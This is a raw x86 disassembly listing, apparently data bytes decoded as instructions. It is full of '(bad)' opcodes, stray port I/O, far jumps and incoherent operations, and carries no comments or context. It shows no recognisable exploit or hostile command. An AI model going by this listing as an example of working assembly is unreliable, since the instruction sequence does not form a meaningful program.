  42188f:	test   DWORD PTR [ebp+0x7221763d],ebp
  421895:	das    
  421896:	or     al,0x57
  421898:	or     al,0xc3
  42189a:	mul    ebp
  42189c:	mov    ebp,0xab3e131e
  4218a1:	sbb    ebp,esi
  4218a3:	and    eax,0x1850131a
  4218a8:	xchg   esp,eax
  4218a9:	imul   ebp,DWORD PTR [ecx+ebp*1],0x5918be89
  4218b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218b1:	mov    edi,0xb64ac37c
  4218b6:	fwait
  4218b7:	xor    al,0x55
  4218b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4218ba:	sbb    BYTE PTR [edi-0x4d],dh
  4218bd:	pop    esi
  4218be:	pop    eax
  4218bf:	add    esp,DWORD PTR [ebp-0x1a]
  4218c2:	push   eax
  4218c3:	mov    BYTE PTR [edx],ch
  4218c5:	mov    dh,0xf5
  4218c7:	fisub  WORD PTR [esi]
  4218c9:	inc    esp
  4218ca:	in     al,0x82
  4218cc:	inc    ecx
  4218cd:	inc    ebx
  4218ce:	sbb    ebp,DWORD PTR [esi-0x76ef25e]
  4218d4:	jb     0x421874
  4218d6:	sahf   
  4218d7:	sub    al,0x1b
  4218d9:	xchg   edx,eax
  4218da:	stc    
  4218db:	xor    al,0xd2
  4218dd:	repz es push cs
  4218e0:	adc    eax,0x5744c444
  4218e5:	fst    QWORD PTR [ecx+0x3e]
  4218e8:	fs cmp bl,ah
  4218eb:	mov    eax,0xa55e66ac
  4218f0:	fwait
  4218f1:	adc    ebp,DWORD PTR [eax+0x2f]
  4218f4:	cmp    dh,dh
  4218f6:	gs xchg ecx,eax
  4218f8:	or     BYTE PTR [edx+esi*4],dh
  4218fb:	cmp    BYTE PTR [esi],bl
  4218fd:	pop    ecx
  4218fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4218ff:	jbe    0x4218cf
  421901:	cld    
  421902:	paddusb mm5,QWORD PTR [esi-0x2f]
  421906:	mov    ebp,0x913bcd40
  42190b:	inc    ebp
  42190c:	test   DWORD PTR [eax],0x55c7fd87
  421912:	les    esp,FWORD PTR [eax+0x7635df26]
  421918:	sar    DWORD PTR [eax+0x7ba8a2d1],cl
  42191e:	mov    ds:0x1053de5f,al
  421923:	mov    DWORD PTR [edi],ebp
  421925:	jne    0x42193b
  421927:	clc    
  421928:	gs (bad) 
  42192a:	icebp  
  42192b:	(bad)  
  42192c:	jbe    0x42193f
  42192e:	pop    ecx
  42192f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421930:	push   es
  421931:	rol    ebp,cl
  421933:	xchg   ecx,eax
  421934:	fsub   DWORD PTR [ebx]
  421936:	mov    ds:0xfe6721cc,al
  42193b:	shl    BYTE PTR [edx+edi*1+0xb156d06],1
  421942:	xchg   ebx,eax
  421943:	mov    ecx,0x63724960
  421948:	ins    BYTE PTR es:[edi],dx
  421949:	adc    eax,0xe8ac4463
  42194e:	sti    
  42194f:	dec    ebp
  421950:	add    DWORD PTR ds:[ebx-0x37],eax
  421954:	out    dx,eax
  421955:	inc    esp
  421956:	shl    bh,1
  421958:	push   ss
  421959:	cli    
  42195a:	pop    esp
  42195b:	xor    edx,ebp
  42195d:	test   al,0x1c
  42195f:	ja     0x421992
  421961:	inc    ebp
  421962:	out    dx,eax
  421963:	jnp    0x4219e0
  421965:	xchg   edx,eax
  421966:	inc    ecx
  421967:	inc    ecx
  421968:	dec    esp
  421969:	jne    0x421954
  42196b:	sbb    cl,BYTE PTR [esi-0x75]
  42196e:	push   esi
  42196f:	aas    
  421970:	daa    
  421971:	into   
  421972:	nop
  421973:	xor    al,0x69
  421975:	sub    ebp,DWORD PTR [esi-0x11a99b8]
  42197b:	pop    DWORD PTR [edi]
  42197d:	fst    DWORD PTR [esi]
  42197f:	fs popa 
  421981:	mov    ebp,0x8dccb38a
  421986:	sbb    eax,0x5ac77998
  42198b:	lahf   
  42198c:	mov    cl,0x5a
  42198e:	xchg   esp,eax
  42198f:	pop    ebx
  421990:	dec    edi
  421991:	sbb    bl,BYTE PTR [ecx]
  421993:	stos   DWORD PTR es:[edi],eax
  421994:	xchg   esp,ebx
  421996:	sbb    ebx,ebx
  421998:	add    al,0xd
  42199a:	iret   
  42199b:	push   esi
  42199c:	xchg   esi,eax
  42199d:	jbe    0x421970
  42199f:	hlt    
  4219a0:	rol    DWORD PTR [ebp+0x50ee5971],cl
  4219a6:	sti    
  4219a7:	mov    al,0x32
  4219a9:	cs clc 
  4219ab:	int3   
  4219ac:	int3   
  4219ad:	or     ah,BYTE PTR [edx+0x5]
  4219b0:	imul   edx,ebp,0xd731fda
  4219b6:	pop    ss
  4219b7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4219b8:	iret   
  4219b9:	shl    DWORD PTR [edi],0x73
  4219bc:	inc    ecx
  4219bd:	repz jb 0x42198c
  4219c0:	gs cmp eax,0x3236afff
  4219c6:	aad    0xd1
  4219c8:	lea    eax,[edx+ebp*2-0x48]
  4219cc:	jmp    0x6cbb:0x7e972b31
  4219d3:	mov    al,ds:0x98b37d36
  4219d8:	sahf   
  4219d9:	and    BYTE PTR [ebx-0x3a099eee],ch
  4219df:	jle    0x421993
  4219e1:	jmp    0x5bfb698e
  4219e6:	dec    edi
  4219e7:	loop   0x421976
  4219e9:	push   0x67
  4219eb:	sub    eax,0x3eb177cf
  4219f0:	pop    edx
  4219f2:	test   al,0x38
  4219f4:	mov    al,0x9d
  4219f6:	retf   
  4219f7:	or     cl,BYTE PTR [eax-0xc9cf71d]
  4219fd:	pop    esp
  4219fe:	adc    dl,dl
  421a00:	pop    ebx
  421a01:	adc    eax,0xc7eb15cc
  421a06:	imul   ebp,DWORD PTR [edx+0x29],0xfffffffc
  421a0a:	clc    
  421a0b:	pop    esp
  421a0c:	sbb    al,0xd8
  421a0e:	adc    al,0x81
  421a10:	imul   ebp,DWORD PTR [esi],0xee0238f4
  421a16:	dec    esp
  421a17:	iret   
  421a18:	in     al,0x74
  421a1a:	mov    WORD PTR ds:0x409fbdd8,es
  421a20:	je     0x421a6c
  421a22:	hlt    
  421a23:	aas    
  421a24:	out    dx,al
  421a25:	in     al,dx
  421a26:	std    
  421a27:	scas   eax,DWORD PTR es:[edi]
  421a28:	aad    0x11
  421a2a:	jle    0x421a5f
  421a2c:	cdq    
  421a2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421a2e:	repz pop es
  421a30:	jne    0x4219e9
  421a32:	jmp    0x4219e3
  421a34:	loopne 0x4219fd
  421a36:	push   esi
  421a37:	(bad)  
  421a39:	fwait
  421a3a:	sub    cl,BYTE PTR [ebx+0x67]
  421a3d:	scas   al,BYTE PTR es:[edi]
  421a3e:	jbe    0x421a32
  421a40:	pop    ds
  421a41:	push   ebx
  421a42:	push   esp
  421a43:	fild   DWORD PTR [ebx+0x6908e733]
  421a49:	cmc    
  421a4a:	inc    esp
  421a4b:	cli    
  421a4c:	ins    BYTE PTR es:[edi],dx
  421a4d:	mov    al,0x1a
  421a4f:	add    DWORD PTR [ebx],esp
  421a51:	cmc    
  421a52:	jnp    0x421a26
  421a54:	mov    ebx,0x152c18c5
  421a59:	mov    bl,0xc8
  421a5b:	lock xor esi,DWORD PTR [esi]
  421a5e:	rcr    DWORD PTR [ecx],cl
  421a60:	dec    ecx
  421a61:	mov    ecx,es
  421a63:	loopne 0x4219fa
  421a65:	in     eax,dx
  421a66:	ins    BYTE PTR es:[edi],dx
  421a67:	mov    bh,BYTE PTR [edi]
  421a69:	popf   
  421a6a:	stos   BYTE PTR es:[edi],al
  421a6b:	mov    eax,ds:0x7c08dad9
  421a70:	div    DWORD PTR [ecx]
  421a72:	or     eax,0x2f1173be
  421a77:	std    
  421a78:	jns    0x421a8f
  421a7a:	lea    edi,[edi]
  421a7c:	mov    ds:0xee248bde,al
  421a81:	push   ss
  421a82:	loop   0x421a29
  421a84:	call   0x8410:0x8938641a
  421a8b:	or     BYTE PTR [esi-0x72824160],bl
  421a91:	push   ss
  421a92:	inc    ebx
  421a93:	aad    0xb2
  421a95:	(bad)  
  421a96:	sbb    cl,bh
  421a98:	sub    DWORD PTR [edi+ecx*2+0x50],0xf98a2872
  421aa0:	popa   
  421aa1:	pop    edx
  421aa2:	adc    BYTE PTR [edi-0x57],al
  421aa5:	sbb    ebp,DWORD PTR [ebx+0x5dd5628d]
  421aab:	or     al,0xac
  421aad:	and    DWORD PTR [esi-0x70],ebx
  421ab0:	mov    eax,ds:0x4d2cd32b
  421ab5:	jmp    0x68cc195e
  421aba:	xor    DWORD PTR [esi+0xf],esi
  421abd:	ja     0x421a62
  421abf:	mov    esi,DWORD PTR [eax]
  421ac1:	sbb    DWORD PTR [ebp+0x5b569a2],eax
  421ac7:	cmp    edx,edx
  421ac9:	jmp    0x421a90
  421acb:	pop    es
  421acc:	adc    eax,0x14bbc8ba
  421ad1:	fwait
  421ad2:	adc    esp,eax
  421ad4:	data16 mov ds:0x7fc28c9d,al
  421ada:	(bad)
  421add:	sbb    ch,bh
  421adf:	stc    
  421ae0:	sbb    eax,0xeda23ed
  421ae5:	repnz cdq 
  421ae7:	fs cwde 
  421ae9:	adc    BYTE PTR [eax-0x55],dl
  421aec:	ficomp DWORD PTR [ebx-0x2d]
  421aef:	inc    edi
  421af0:	jno    0x421a8c
  421af2:	pop    ecx
  421af3:	out    dx,eax
  421af4:	(bad)  
  421af5:	push   ebx
  421af6:	fwait
  421af7:	push   0x4dec8b47
  421afc:	cmp    BYTE PTR [ebp+0x717a9258],dl
  421b02:	popa   
  421b03:	and    bh,BYTE PTR [eax+0x7a891889]
  421b09:	(bad)  
  421b0a:	rol    DWORD PTR [edx+0xdaf993f],0xba
  421b11:	cwde   
  421b12:	jmp    0x421b03
  421b14:	enter  0xe00,0x24
  421b18:	jmp    0x854f2fb
  421b1d:	pop    esi
  421b1e:	cwde   
  421b1f:	pop    ebx
  421b20:	popf   
  421b21:	dec    eax
  421b22:	(bad)  
  421b24:	daa    
  421b25:	push   ebp
  421b26:	push   edx
  421b27:	inc    esi
  421b28:	out    dx,eax
  421b29:	inc    eax
  421b2a:	sub    eax,0x703bf568
  421b2f:	mov    esp,edi
  421b31:	xor    dh,BYTE PTR [esi]
  421b33:	sbb    eax,0x3e957727
  421b38:	cmp    al,0xeb
  421b3a:	cwde   
  421b3b:	daa    
  421b3c:	(bad)
  421b3f:	retf   
  421b40:	xchg   DWORD PTR [eax+0x2f],ecx
  421b43:	cmp    eax,0x712eb1c6
  421b48:	call   0x76a3:0x4bbddf5
  421b4f:	jae    0x421b41
  421b51:	outs   dx,BYTE PTR ds:[esi]
  421b52:	inc    esp
  421b53:	fidivr WORD PTR [eax]
  421b55:	sub    dh,ch
  421b57:	jle    0x421bad
  421b59:	mov    ch,0x78
  421b5b:	lods   eax,DWORD PTR ds:[esi]
  421b5c:	inc    edx
  421b5d:	mov    bl,0x92
  421b5f:	xor    eax,0xf5404962
  421b64:	xchg   DWORD PTR [ecx+0xb9fd71e],edx
  421b6a:	pop    ebp
  421b6b:	mov    esp,0xcd521be4
  421b70:	sub    al,0xab
  421b72:	idiv   BYTE PTR [ebp+0x53d8d4e3]
  421b78:	jae    0x421b6a
  421b7a:	(bad)  
  421b7b:	mov    eax,0x583f914d
  421b80:	inc    esi
  421b81:	pop    bp
  421b83:	mov    ecx,0xcecfff3e
  421b88:	dec    edi
  421b89:	or     ah,BYTE PTR [eax+0x5eb033c0]
  421b8f:	mov    al,0xd0
  421b91:	and    DWORD PTR [edx+0x4a],edx
  421b94:	and    BYTE PTR ds:0xac04b8e4,ch
  421b9a:	(bad)  
  421b9b:	mov    al,ds:0xa22a1f4a
  421ba0:	mov    ebx,ss
  421ba2:	pop    ebx
  421ba3:	sub    DWORD PTR [eax+0x18],0x9cd2c890
  421baa:	clc    
  421bab:	mov    WORD PTR [esi],?
  421bad:	mov    BYTE PTR [edi+eiz*8+0x0],dl
  421bb1:	dec    ebx
  421bb2:	pop    esi
  421bb3:	dec    edx
  421bb4:	mov    eax,ds:0xe4ef1b7c
  421bb9:	dec    edx
  421bba:	sbb    ah,dl
  421bbc:	mov    dh,0x89
  421bbe:	stos   DWORD PTR es:[edi],eax
  421bbf:	cmp    BYTE PTR [ecx+0x1389df10],ah
  421bc5:	test   BYTE PTR [esi],cl
  421bc7:	mov    dl,0x94
  421bc9:	push   ecx
  421bca:	lods   eax,DWORD PTR ds:[esi]
  421bcb:	aam    0xf6
  421bcd:	(bad)  
  421bcf:	jge    0x421c15
  421bd1:	daa    
  421bd2:	sbb    DWORD PTR [ecx],ebx
  421bd4:	lods   eax,DWORD PTR ds:[esi]
  421bd5:	movsx  ebx,bp
  421bd8:	rcl    BYTE PTR [ecx],cl
  421bda:	sti    
  421bdb:	jmp    FWORD PTR [ebp-0x6c]
  421bde:	adc    esp,DWORD PTR [edi]
  421be0:	push   ds
  421be1:	or     BYTE PTR [edi],dh
  421be3:	addr16 enter 0xea49,0x70
  421be8:	mov    dh,0x25
  421bea:	jmp    0x421b99
  421bec:	ror    BYTE PTR [eax],cl
  421bee:	lea    esi,[edi+edx*4+0x8]
  421bf2:	xlat   BYTE PTR ds:[ebx]
  421bf3:	lock nop
  421bf5:	push   0x9f0ea3bb
  421bfa:	mov    ah,0xa
  421bfc:	push   esi
  421bfd:	jnp    0x421c20
  421bff:	sbb    esp,DWORD PTR [eax-0x51a54e62]
  421c05:	and    esi,edx
  421c07:	in     eax,dx
  421c08:	push   edi
  421c09:	jmp    0x421c4b
  421c0b:	cmp    cl,BYTE PTR [eax-0x50]
  421c0e:	dec    edx
  421c0f:	into   
  421c10:	loopne 0x421c76
  421c12:	outs   dx,BYTE PTR ds:[esi]
  421c13:	(bad)  
  421c14:	cld    
  421c15:	adc    al,0x9e
  421c17:	fsub   QWORD PTR [edx+ecx*8-0x75]
  421c1b:	out    dx,al
  421c1c:	cmp    DWORD PTR [esi+0x20],esp
  421c1f:	xor    ah,al
  421c21:	sbb    ch,BYTE PTR [ebx]
  421c23:	lahf   
  421c24:	mov    eax,DWORD PTR [eax+0x5783ddb6]
  421c2a:	test   eax,0x437576fb
  421c2f:	sub    al,0x9f
  421c31:	jnp    0x421c7e
  421c33:	adc    eax,0x26ccb352
	...
  421c40:	add    BYTE PTR [edx+eax*8],cl
  421c43:	xlat   BYTE PTR ds:[ebx]
  421c44:	and    bl,bh
  421c46:	aaa    
  421c47:	std    
  421c48:	out    dx,al
  421c49:	and    eax,0xfc971a56
  421c4e:	add    eax,0x95f4f942
  421c53:	add    DWORD PTR [eax],eax
  421c55:	scas   eax,DWORD PTR es:[edi]
  421c56:	add    eax,DWORD PTR [eax]
  421c58:	add    BYTE PTR ds:0x2d28432,al
  421c5e:	into   
  421c5f:	add    BYTE PTR [edx-0x17c8336d],dh
  421c65:	or     ebp,DWORD PTR [edi]
  421c67:	inc    ecx
  421c68:	es imul edi,edi,0xffffffd4
  421c6c:	sub    DWORD PTR [edi+0x7374cbcf],eax
  421c72:	or     eax,DWORD PTR [ebp-0x5c]
  421c75:	add    cl,BYTE PTR [ecx]
  421c77:	jnp    0x421c04
  421c79:	mov    bl,0x8
  421c7b:	repz xchg ebx,eax
  421c7d:	retf   0x397a
  421c80:	add    al,0x63
  421c82:	(bad)  
  421c83:	call   0x3b2620b8
  421c88:	rcl    DWORD PTR [esi],0xd7
  421c8b:	sbb    al,0xbe
  421c8d:	mov    esi,0xafac145a
  421c92:	and    BYTE PTR [ecx-0x71],bl
  421c95:	pop    esi
  421c96:	adc    al,BYTE PTR [eax-0x19]
  421c99:	mov    ch,0xda
  421c9b:	sub    eax,0x61e5e598
  421ca0:	call   0xb5f12239
  421ca5:	jne    0x421c43
  421ca7:	mov    cl,0xf3
  421ca9:	in     eax,0x36
  421cab:	xor    eax,0xc3dd491b
  421cb0:	or     ah,0x2d
  421cb3:	xor    edi,ebp
  421cb5:	or     DWORD PTR [esi],0x5b455e71
  421cbb:	fnsave [eax+edx*4-0x50]
  421cbf:	pop    es
  421cc0:	add    esp,edx
  421cc2:	add    ah,cl
  421cc4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421cc5:	xor    eax,0xa950e168
  421cca:	jno    0x421ca5
  421ccc:	add    ah,dl
  421cce:	push   ss
  421ccf:	js     0x421cf0
  421cd1:	adc    DWORD PTR [ebx-0x70],esi
  421cd4:	xor    BYTE PTR [edx],ah
  421cd6:	mov    al,0xcb
  421cd8:	xchg   esp,eax
  421cd9:	sub    bl,BYTE PTR [esi+0x16]
  421cdc:	and    BYTE PTR [edx-0x3d6caf20],dh
  421ce2:	cmc    
  421ce3:	sbb    eax,0x3220312
  421ce8:	test   al,0xf8
  421cea:	xor    DWORD PTR [eax-0x6999d905],eax
  421cf0:	popf   
  421cf1:	mov    eax,0x636a848d
  421cf6:	push   ebx
  421cf7:	test   DWORD PTR [esi-0x27a3c031],0xfbd2ecf1
  421d01:	xor    edx,DWORD PTR [edx+0x50a65c95]
  421d07:	test   al,0x56
  421d09:	ins    DWORD PTR es:[edi],dx
  421d0a:	mov    bh,0x88
  421d0c:	fs jmp 0x4091a6a3
  421d12:	scas   al,BYTE PTR es:[edi]
  421d13:	or     eax,0xd8010b09
  421d18:	dec    ebx
  421d19:	sub    BYTE PTR [edi+0x69],cl
  421d1c:	jb     0x421d54
  421d1e:	dec    eax
  421d1f:	(bad)  
  421d20:	test   BYTE PTR [ebx+0x34],0xe8
  421d24:	imul   edx,DWORD PTR [ebx+ecx*1],0x8
  421d28:	mov    BYTE PTR [ebx],bl
  421d2a:	dec    esi
  421d2b:	je     0x421d19
  421d2d:	add    DWORD PTR [edx-0x20ed69dd],0x36
  421d34:	icebp  
  421d35:	aad    0xe2
  421d37:	ficom  WORD PTR [esi-0x3d]
  421d3a:	cmp    BYTE PTR [ebx+0x9],ch
  421d3d:	pop    ss
  421d3e:	ins    DWORD PTR es:[edi],dx
  421d3f:	sbb    eax,0xa319aff1
  421d44:	adc    al,0xd9
  421d46:	jecxz  0x421d09
  421d48:	fiadd  WORD PTR [ecx+0x1894a9b]
  421d4e:	push   0xb0b7fe0c
  421d53:	call   0xd012:0x664b41f9
  421d5a:	sbb    al,cl
  421d5c:	pop    DWORD PTR [ecx+0x6684112c]
  421d62:	test   ebp,ecx
  421d64:	enter  0xc186,0x3
  421d68:	cdq    
  421d69:	stc    
  421d6a:	(bad)  
  421d6b:	in     al,dx
  421d6c:	dec    edi
  421d6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421d6e:	cli    
  421d6f:	adc    ecx,eax
  421d71:	xchg   edx,eax
  421d72:	ret    0x113a
  421d75:	push   cs
  421d76:	pop    eax
  421d77:	add    bh,bl
  421d79:	sub    DWORD PTR gs:[eax],ebx
  421d7c:	mov    dl,0x0
  421d7e:	retf   
  421d7f:	mov    ds:0xd22e122e,eax
  421d84:	lock aad 0x32
  421d87:	fs push cs
  421d89:	in     al,0x38
  421d8b:	pop    esi
  421d8c:	mov    ds:0xf903402,al
  421d91:	jb     0x421db8
  421d93:	xchg   edx,eax
  421d94:	lods   eax,DWORD PTR ds:[esi]
  421d95:	cdq    
  421d96:	xchg   ebp,eax
  421d97:	mov    es,edi
  421d99:	xchg   edx,eax
  421d9a:	hlt    
  421d9b:	push   ds
  421d9c:	sbb    eax,DWORD PTR [eax-0x38]
  421d9f:	das    
  421da0:	aaa    
  421da1:	sbb    al,BYTE PTR ds:0xf7d4206d
  421da7:	cmp    eax,0x28ebe5d4
  421dac:	stos   DWORD PTR es:[edi],eax
  421dad:	push   ss
  421dae:	xchg   edi,eax
  421daf:	push   ds
  421db0:	xchg   ecx,eax
  421db1:	push   ecx
  421db2:	(bad)  [esp+edx*2-0x43e06890]
  421db9:	ret    0x381c
  421dbc:	add    al,0x26
  421dbe:	push   ebp
  421dbf:	pusha  
  421dc0:	inc    ecx
  421dc1:	retf   0x6ab8
  421dc4:	pop    es
  421dc5:	push   ds
  421dc6:	xchg   BYTE PTR [esi+eiz*8+0x5829c16b],dh
  421dcd:	sub    al,BYTE PTR [eax-0x41598ef4]
  421dd3:	nop
  421dd4:	jmp    0xd1446531
  421dd9:	fcmovbe st,st(5)
  421ddb:	pop    ds
  421ddc:	or     BYTE PTR [edi-0x2a61f624],ah
  421de2:	xchg   esi,eax
  421de3:	dec    ebx
  421de4:	and    dl,BYTE PTR [ecx]
  421de6:	into   
  421de7:	popf   
  421de8:	in     al,0xa9
  421dea:	fild   QWORD PTR [ecx-0x14574cfd]
  421df0:	bound  esp,QWORD PTR [eax]
  421df2:	inc    BYTE PTR [eax+0x6107064]
  421df8:	adc    eax,0xa098ae94
  421dfd:	int    0xca
  421dff:	jae    0x421d97
  421e01:	(bad)  
  421e02:	inc    esi
  421e03:	push   edx
  421e04:	pop    ebp
  421e05:	mov    ds:0x5e57a868,eax
  421e0a:	(bad)  
  421e0b:	lock xchg esp,eax
  421e0d:	neg    DWORD PTR [edx-0x15b793a5]
  421e13:	js     0x421e62
  421e15:	loope  0x421e7d
  421e17:	jbe    0x421e4c
  421e19:	sbb    BYTE PTR [ebp+0x13],0xbf
  421e1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421e1e:	jns    0x421e4c
  421e20:	jns    0x421e8f
  421e22:	and    dl,BYTE PTR [edi]
  421e24:	push   esp
  421e25:	sti    
  421e26:	mov    ecx,0xf987e21d
  421e2b:	lahf   
  421e2c:	add    al,0x54
  421e2e:	in     al,0xd3
  421e30:	scas   al,BYTE PTR es:[edi]
  421e31:	xchg   ecx,eax
  421e32:	xchg   edx,eax
  421e33:	and    esi,esi
  421e35:	repnz pusha 
  421e37:	lods   eax,DWORD PTR ds:[esi]
  421e38:	fxch   st(4)
  421e3a:	jg     0x421dc2
  421e3c:	sahf   
  421e3d:	pop    ss
  421e3e:	jmp    0x84d6:0xc5b9c341
  421e45:	aam    0x69
  421e47:	sub    al,0xe1
  421e49:	pushf  
  421e4a:	pop    esi
  421e4b:	adc    al,BYTE PTR [ebp-0x4b]
  421e4e:	nop
  421e4f:	and    ch,BYTE PTR [esp+esi*4-0x2d5337a]
  421e56:	push   esp
  421e57:	je     0x421e8e
  421e59:	push   ecx
  421e5a:	or     al,0x68
  421e5c:	xchg   edi,eax
  421e5d:	dec    esi
  421e5e:	rcl    BYTE PTR [eax+0x6ce02d0c],0xf0
  421e65:	je     0x421e49
  421e67:	cld    
  421e68:	mov    eax,ds:0xdb901f49
  421e6d:	push   es
  421e6e:	std    
  421e6f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421e70:	sbb    eax,0xe7475423
  421e75:	pop    esp
  421e76:	push   cs
  421e77:	or     ebx,DWORD PTR [ebp+0x28f7432d]
  421e7d:	mov    ds:0x7b2e4ac9,al
  421e82:	mov    al,ds:0x42ee71cd
  421e87:	xchg   esi,eax
  421e88:	sub    cl,BYTE PTR [edx+0x5]
  421e8b:	rcr    cl,0xf1
  421e8e:	ret    
  421e8f:	jne    0x421ecb
  421e91:	push   0xbb6bba5
  421e96:	scas   eax,DWORD PTR es:[edi]
  421e97:	xor    eax,0xbea13f22
  421e9c:	outs   dx,DWORD PTR ds:[esi]
  421e9d:	xor    esi,DWORD PTR [edx+0x724d08]
  421ea3:	jmp    0x650e:0x1da0ecc1
  421eaa:	fwait
  421eab:	cs or  eax,0xb8a545d6
  421eb1:	cmp    al,0x61
  421eb3:	or     BYTE PTR [bx+si-0x7a2b],bl
  421eb8:	mov    ds:0x531be0ea,al
  421ebd:	mov    al,ds:0x923c4245
  421ec2:	repz lock pop edx
  421ec5:	dec    ebp
  421ec6:	dec    ecx
  421ec7:	out    dx,eax
  421ec8:	or     DWORD PTR [edx],edx
  421eca:	outs   dx,DWORD PTR ds:[esi]
  421ecb:	int3   
  421ecc:	in     al,dx
  421ecd:	xor    esi,ebx
  421ecf:	scas   al,BYTE PTR es:[edi]
  421ed0:	mov    eax,ebx
  421ed2:	fbstp  TBYTE PTR [edx]
  421ed4:	lods   eax,DWORD PTR ds:[esi]
  421ed5:	data16 scas al,BYTE PTR es:[edi]
  421ed7:	xchg   esi,eax
  421ed8:	loope  0x421eb7
  421eda:	pop    edi
  421edb:	mov    DWORD PTR [ecx+0x75d4b73a],ecx
  421ee1:	loop   0x421ed0
  421ee3:	jmp    0x912f:0x143eabf0
  421eea:	or     BYTE PTR [edx+ecx*4+0x29],ah
  421eee:	arpl   WORD PTR [ebx],si
  421ef0:	enter  0x3ec3,0xb6
  421ef4:	xchg   esi,eax
  421ef5:	sbb    ch,BYTE PTR fs:[edx-0x31]
  421ef9:	push   ecx
  421efa:	mov    ecx,0x478035e4
  421eff:	xor    cl,BYTE PTR [edi+esi*4+0x3ee6fc65]
  421f06:	sub    DWORD PTR [esi+0x4656521],eax
  421f0c:	arpl   WORD PTR [ecx+0x75],ax
  421f0f:	pop    edx
  421f10:	popa   
  421f11:	mov    ds:0xfcbd0467,al
  421f16:	popf   
  421f17:	add    eax,0x8a7ccbff
  421f1c:	ret    0xc32
  421f1f:	sub    al,0x26
  421f21:	mov    al,0x41
  421f23:	imul   esi,DWORD PTR es:[esi],0xecf04a20
  421f2a:	add    dh,BYTE PTR [ebp+esi*8+0x33]
  421f2e:	repnz ficom DWORD PTR gs:[eax]
  421f32:	adc    al,0x6c
  421f34:	loop   0x421f6c
  421f36:	sbb    ch,BYTE PTR [ecx-0x7a94bea7]
  421f3c:	es adc dh,al
  421f3f:	cdq    
  421f40:	xchg   esp,eax
  421f41:	jmp    0x421fbc
  421f43:	arpl   WORD PTR ds:0x64209f79,bp
  421f49:	push   0x64
  421f4b:	loop   0x421f41
  421f4d:	mov    al,0xce
  421f4f:	inc    eax
  421f50:	sar    BYTE PTR [edx],0x45
  421f53:	inc    ebx
  421f54:	inc    edx
  421f55:	cmc    
  421f56:	inc    ebp
  421f57:	test   BYTE PTR [edx-0x5a],0xf2
  421f5b:	mov    eax,fs
  421f5d:	pop    esp
  421f5e:	and    DWORD PTR [esi-0x41cbf34a],0x5f72748b
  421f68:	or     DWORD PTR [eax+0x16676fc5],esp
  421f6e:	mov    al,0x8
  421f70:	xor    eax,0xeebdaf29
  421f75:	and    al,0x2e
  421f77:	mov    al,ds:0x3bd27986
  421f7c:	stos   BYTE PTR es:[edi],al
  421f7d:	sbb    BYTE PTR [ecx+0x28],0x2d
  421f81:	mov    eax,ds:0xc2b9ad89
  421f86:	sbb    dx,WORD PTR [eax+0x3b18aaf2]
  421f8d:	imul   eax,eax,0xfffffffb
  421f90:	sub    ecx,DWORD PTR [edx-0x5c752510]
  421f96:	imul   eax,DWORD PTR [ecx],0x73
  421f99:	mov    BYTE PTR [eax+eiz*2+0xb],bl
  421f9d:	retf   0xdcbc
  421fa0:	repnz push 0xffffffc7
  421fa3:	fdiv   DWORD PTR [edi-0x1cacb78a]
  421fa9:	jmp    0x816a:0xe6f5b1cf
  421fb0:	add    eax,edi
  421fb2:	ja     0x421f8f
  421fb4:	inc    ecx
  421fb5:	adc    BYTE PTR [edx],cl
  421fb7:	jle    0x421f3c
  421fb9:	jmp    0x421fc1
  421fbb:	dec    esi
  421fbc:	xchg   BYTE PTR [ecx-0x5b],bl
  421fbf:	int3   
  421fc0:	sti    
  421fc1:	cmp    ebp,DWORD PTR [edx+0x0]
  421fc4:	and    cl,BYTE PTR [eax-0x19]
  421fc7:	mov    al,ch
  421fc9:	test   al,ch
  421fcb:	out    dx,al
  421fcc:	push   edx
  421fcd:	mov    ss,WORD PTR [ebp-0x3c4e417a]
  421fd3:	or     eax,0x3507235b
  421fd8:	pop    ds
  421fd9:	sub    dh,bh
  421fdb:	mov    bl,0x58
  421fdd:	lds    esi,FWORD PTR [esi+0x70]
  421fe0:	mov    fs,WORD PTR [ecx-0x76]
  421fe3:	lods   eax,DWORD PTR ds:[esi]
  421fe4:	mov    DWORD PTR [ebx-0x74],esi
  421fe7:	dec    ecx
  421fe8:	push   edx
  421fe9:	cli    
  421fea:	mov    DWORD PTR [edx+0x74],edx
  421fed:	jg     0x421fc4
  421fef:	or     BYTE PTR [ebp+ebp*8+0x7f18a13e],dl
  421ff6:	push   esi
  421ff8:	sub    DWORD PTR [eax-0x5d],esp
  421ffb:	and    DWORD PTR [edi],edi
  421ffd:	and    ecx,esp
  421fff:	xor    BYTE PTR fs:[ecx+0x64],dl
  422003:	test   esi,esp
  422005:	xor    ecx,esp
  422007:	outs   dx,DWORD PTR ds:[esi]
	...
  422010:	add    BYTE PTR [edx+0x4f],al
  422013:	nop
  422014:	int3   
  422015:	popf   
  422016:	fistp  WORD PTR [esi-0x31]
  422019:	lea    ecx,[ebx]
  42201b:	jmp    0xd864a176
  422020:	dec    edi
  422021:	mov    ds:0xaf000199,eax
  422026:	add    eax,DWORD PTR [eax]
  422028:	add    dl,bh
  42202a:	fwait
  42202b:	aad    0x5a
  42202d:	and    eax,0x93ca9fd1
  422032:	fisubr DWORD PTR [ebp-0x5026ff70]
  422038:	hlt    
  422039:	add    edx,edx
  42203b:	fs inc eax
  42203d:	push   eax
  42203e:	mov    dl,0x68
  422040:	aad    0xb8
  422042:	test   DWORD PTR [edx+ebx*2+0x453cbf59],0x27bafe4
  42204d:	cmp    BYTE PTR [ebp-0x70],bl
  422050:	mov    DWORD PTR ds:0x66848243,edi
  422056:	add    BYTE PTR [edi+0x5f],al
  422059:	add    BYTE PTR [eax-0x75],dl
  42205c:	mov    DWORD PTR [ebx+0x34ac2d57],0xf7e9a2ab
  422066:	pop    ebx
  422067:	aas    
  422068:	or     eax,0xa9651f55
  42206d:	jl     0x422045
  42206f:	(bad)  [ebp-0x65e98d31]
  422075:	(bad)  
  422076:	mov    esi,DWORD PTR [eax+esi*1+0xc]
